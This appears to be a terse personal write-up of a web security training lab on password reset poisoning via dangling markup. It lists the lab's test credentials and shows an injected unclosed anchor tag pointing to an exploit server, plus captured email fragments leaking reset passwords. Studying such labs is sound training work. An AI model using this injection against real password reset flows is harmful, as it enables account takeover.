Lab #7 – Password reset poisoning via dangling markup

Vulnerable parameter - Password reset functionality

Goal - Perform password reset poisoing via dangling markup.

creds - wiener:peter

Analysis:


<a href='https://0a68005103145ff28088fd4400b90070.web-security-academy.net:'><a href='https://exploit-0a57008603ee5f9780bbfcb0013a00fb.exploit-server.net/?login'>click here</a> to login with your new password: IrXeyW3cTi</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>

/?/login'>click+here</a>+to+login+with+your+new+password:+NebdDO1053</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i>